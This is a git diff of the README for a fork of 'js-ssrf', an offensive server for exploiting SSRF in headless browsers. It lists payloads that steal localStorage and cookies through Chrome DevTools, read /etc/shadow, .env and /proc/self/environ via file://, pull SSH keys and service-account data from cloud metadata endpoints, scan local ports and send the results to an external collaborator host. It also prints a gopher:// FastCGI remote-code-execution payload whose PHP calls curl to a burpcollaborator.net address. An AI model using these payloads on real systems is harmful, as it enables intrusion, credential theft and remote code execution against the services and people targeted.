@@ -1,112 +1,162 @@
 # js-ssrf
+
 Server prepared for SSRF post exploitation, javascript exploits, tools and open redirect.
 
 *AFTER SSRF*
 
-# Installation
+## Fork Changes
 
-```
-git clone https://github.com/RafaelSantos025/js-ssrf.gi
+This fork includes several improvements and new features:
+
+### New Features
+- **Chrome DevTools Protocol (CDP) exploitation** - Scans multiple debug ports (9222, 9229, 9481, 5858, 3389) and extracts data via WebSocket
+- **File protocol attacks** - Read local files and list directories via `file://` protocol (for server-side headless browsers)
+- **Sandbox detection** - Detects if browser is running with `--no-sandbox` flag
+- **No-JS tracking** - Uses `<img>` tags to track requests even when JavaScript is disabled
+- **Dynamic payload generation** - Select which exploits to run via URL parameter `?f=`
+- **Auto-decoded logs** - Base64 logs are automatically decoded on the server
+
+### CLI Improvements
+- `-c, --collaborator <url>` - Set external collaborator server for exfiltration
+- `-p, --port <port>` - Set server port (default: 2222)
+- `-h, --help` - Show help message
+
+### Code Fixes
+- Fixed syntax error in `localStorageLeak()`
+- Updated deprecated `req.connection.remoteAddress` to `req.socket.remoteAddress`
+- Converted synchronous XHR to async
+- Fixed uninitialized variables and missing `var` declarations
+- Fixed typos (`communPorts` -> `commonPorts`, `matadataPaths` -> `metadataPaths`)
+- Protocol-aware requests (http/https based on page protocol)
+
+---
+
+## Installation
+
+```bash
+git clone https://github.com/YOUR_USERNAME/js-ssrf.git
 cd js-ssrf/
-npm install express
+npm install
 ```
 
-# How To Run
+## How To Run
 
-```
+```bash
+# Basic usage (logs to local /log endpoint)
 node server.js
+
+# With external collaborator
+node server.js -c your-collaborator.com
+
+# Custom port
+node server.js -p 8080 -c your-collaborator.com
+
+# Show help
+node server.js -h
 ```
+
+## Payload URL Parameters
+
+Select which exploits to run via the `?f=` parameter:
+
+```
+https://your-server/?f=all                           # Run all exploits (default)
+https://your-server/?f=localStorage,chromeHeadless   # Run specific exploits
+https://your-server/?f=fileRead,fileList             # File protocol attacks only
+https://your-server/?f=cdpExtract&wsUrl=ws://...     # CDP WebSocket extraction
+```
+
+### Available Functions
+
+| Function | Description |
+|----------|-------------|
+| `localStorage` | Steal browser localStorage |
+| `chromeHeadless` | Scan for Chrome DevTools Protocol endpoints |
+| `cdpExtract` | Extract cookies/data via CDP WebSocket (requires `&wsUrl=`) |
+| `browserInfo` | Get browser information and plugins |
+| `cloudMetadata` | Fetch cloud provider metadata (AWS, GCP, Alibaba, DigitalOcean) |
+| `portScanner` | Scan local ports |
+| `fileRead` | Read local files via `file://` protocol |
+| `fileList` | List directories via `file://` protocol |
+| `all` | Run all functions (except cdpExtract) |
 
 ## Available Exploits And Tools
-* Browser Storage Leak
-* Chrome Headless Debug Enabled
-* Leak Browser Information (Plugins, versions, etc ...)
-* Cloud Metadata Information
-* Local Port Scanner
-* Open redirect
 
-# How To Use
+- Browser Storage Leak
+- Chrome DevTools Protocol Exploitation (CDP)
+- File Protocol Attacks (file://)
+- Sandbox Detection
+- Leak Browser Information (Plugins, versions, etc...)
+- Cloud Metadata Information
+- Local Port Scanner
+- Open Redirect
+- No-JS Tracking
 
-## Open Redirect
+## How To Use
+
+### Open Redirect
+
 Any request that starts with **/openredirect** will redirect to the passed URL in the **url** parameter with the given scheme and parameters. You can abuse of the **gopher://** scheme to get remote code execution.
 
-**Redirect to Google Example:** http://127.0.0.1:2222/openredirect?url=https://www.google.com
-
-**Exploit Fastcgi RCE example:** http://127.0.0.1:2222/openredirect?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27curl%20dm3lxhjmrekd2fwnsns1r1iin9t0hp.burpcollaborator.net%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
-
-## Browser Storage Leak, Chrome Headless Debug Enabled, Leak Browser Information (Plugins, versions, etc ...), Cloud Metadata Information and Local Port Scanner
-
-You need to edit the HTML page located at htmls/js-exploits.html (every request to the root page will trigger this HTML). 
-
-#### Inportant: 
-Edit the value of **collaboratorServer**  to your burp collaborator or log server, because this is how the server will retrieve the sensitive information.
-
+**Redirect to Google Example:**
 ```
-//Collaborator server to receive info
-var collaboratorServer = "ysu632p7xzqy8028y8ymxmo3tuzkn9.burpcollaborator.net";
+http://127.0.0.1:2222/openredirect?url=https://www.google.com
 ```
 
-If you don't have a log or burp collaborator server, this server has one in the **/log** path:
-
-**Example:** http://127.0.0.1:2222/log?msg=LOGTHIS
-
-**Server Log Output**:
-
+**Exploit Fastcgi RCE example:**
 ```
-Connection received: ::ffff:127.0.0.1
-/log?msg=LOGTHIS
+http://127.0.0.1:2222/openredirect?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20...
 ```
 
-To use this server log you just need to edit the value of **collaboratorServer** to your IP address and port:
+### Server Log
 
-**Example (External IP):** 
-
-```
-//Collaborator server to receive info
-var collaboratorServer = "208.12.33.44:2222";
-```
-
-#### JS Exploits and Tools
-Uncomment the following lines that call the respective exploit function that you want:
+The server automatically decodes base64 log messages:
 
 ```
-//Browser Storage Leak
-//localStorageLeak();
-
-//Try to fetch Chrome Headless debug port
-//chromeHeadless();
-
-//Get browser information (Plugins, versions, etc ...)
-//getBrowserInfo();
-
-//GET Cloud metadata information
-//cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);
-
-//Local port scanner
-//portScanner("127.0.0.1", communPorts);
+[LOG] Triggered in https://victim.com/
+[LOG] LocalStorageLeak: token=abc123&session=xyz
+[LOG] CDP WebSocket URL found: ws://127.0.0.1:9222/devtools/browser/...
 ```
 
-To help you, I already hardcoded some metadata servers and their paths to leak the desired information:
+### No-JS Tracking
+
+Even if JavaScript is disabled, the server tracks requests via `<img>` tags:
 
 ```
-//Google Cloud
-var googleMetadataServer = "metadata.google.internal";
-var googleMetadataPaths = {"SSH-Keys: ": "/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json", "Service Accounts: ": "/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json", "Hostname: ": "/computeMetadata/v1/instance/hostname"}
-var googleHeaders = {"X-Google-Metadata-Request": "true"}
+[PING] type=img ip=192.168.1.100 ua=Mozilla/5.0 ...
+[PING] type=noscript ip=192.168.1.100 ua=...    # JS was disabled
+```
 
-//Alibaba Cloud
-var alibabaMetadataServer = "100.100.100.200";
-var alibabaMetadataPaths = {"SSH-Keys: ":"/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/hostname", "User-Data: ": "/latest/user-data"};
+### Cloud Metadata Servers
 
-//Amazon AWS & D.O
-var othersMetadataServers = "169.254.169.254";
+Pre-configured metadata paths for:
 
-//Amazon
-var amazonMetadataPaths = {"SSH-Keys: ": "/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/public-hostname", "AMI-ID: ": "/latest/meta-data/ami-id"};
+| Provider | Server |
+|----------|--------|
+| Google Cloud | metadata.google.internal |
+| Alibaba Cloud | 100.100.100.200 |
+| Amazon AWS | 169.254.169.254 |
+| Digital Ocean | 169.254.169.254 |
 
-//Digital Ocean
-var digitalOceanPaths = {"User-data": "/metadata/v1/user-data", "Hostname: ": "/metadata/v1/hostname", "SSH-Keys: ": "/metadata/v1/public-keys"}
+### CDP Debug Ports Scanned
 
-//Local port scanner | Commun ports
-var communPorts = [80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017]
+| Port | Service |
+|------|---------|
+| 9222 | Chrome DevTools default |
+| 9229 | Node.js inspector |
+| 9481 | Alternative CDP |
+| 5858 | Legacy Node debug |
+| 3389 | Alternative debug |
+
+### Sensitive Files Read (file:// attacks)
+
+```
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/app/.env
+/.env
+/var/log/auth.log
 ```
